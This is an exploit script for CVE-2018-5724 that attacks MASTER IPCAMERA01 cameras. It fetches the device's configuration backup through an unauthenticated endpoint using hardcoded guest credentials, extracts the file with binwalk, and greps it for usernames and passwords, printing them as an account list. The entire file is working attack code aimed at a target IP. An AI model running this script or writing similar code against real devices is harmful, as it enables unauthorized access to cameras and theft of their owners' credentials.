import requests
import sys
import os
import time
from colorama import Fore

decription= r"""
 --------------------------------------------------------------------
|                           CVE-2018-5724                            |
|                                                                    |
| MASTER IPCAMERA01 3.3.4.2103 devices allow Unauthenticated         |
| Configuration Download and Upload, as demonstrated by restore.cgi. |
 --------------------------------------------------------------------
"""

if len(sys.argv) is not 2:
	print(decription)
	print(Fore.YELLOW+"[-] Example: python cve-2018-5724.py <Target IP>"+Fore.RESET)
	sys.exit()

target=sys.argv[1]
headers={'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=', 'Upgrade-Insecure-Requests':'1'}
url="http://"+target+"/tmpfs/config_backup.bin"
s=requests.Session()

print(decription)
print Fore.YELLOW+"[*] Attack on "+target+Fore.RESET
print Fore.YELLOW+"[+] Sending the payload"+Fore.RESET
time.sleep(1)

r=s.get(url, headers=headers)
if r.status_code == 200:
	print(Fore.YELLOW+"[+] Exploit Success"+Fore.RESET)
	time.sleep(1)
	print("")
	print("")

file = open('backup.bin','wb')
for chunk in r.iter_content(100000):
	file.write(chunk)
file.close()
print Fore.YELLOW+"---------------------------- ACCOUNT LIST ----------------------------"+Fore.RESET
os.system("binwalk -e backup.bin >/dev/null")
os.system("cd _backup.bin.extracted ; strings 0 | egrep 'user|password|passwd' ; cd ../ ; rm -rf _backup.bin.extracted ")
